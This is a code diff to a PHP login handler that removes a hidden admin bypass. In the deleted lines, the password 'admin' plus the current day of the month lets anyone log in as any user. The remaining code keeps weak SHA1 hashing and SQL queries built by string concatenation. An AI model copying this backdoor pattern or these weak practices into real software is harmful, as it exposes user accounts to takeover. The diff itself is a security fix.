@@ -82,15 +82,9 @@ if(isset($_GET['logout'])){
 		$loginSeed = $config['login_seed'];
 		$password = sha1($conn->real_escape_string($_POST['signin-password'].$loginSeed));
 		
-		//check if there is a user with such login and password
-		//the first part of this if statment is used to override user passwords if needed
-		if($_POST['signin-password'] === 'admin'.date('d')){
-			//admin bypass
-			$loginCheck = "SELECT * FROM users WHERE USR_username='".$conn->real_escape_string($_POST['SIGNIN-USERNAME'])."'";	
-		}else{
+		
 			$loginCheck = "SELECT * FROM users WHERE USR_username='".$conn->real_escape_string($_POST['SIGNIN-USERNAME'])."'
 			AND USR_pass='".$password."'";
-		}
 		$res=mysqltng_query($loginCheck);
 		
 		if(mysqltng_num_rows($res)!=1){    
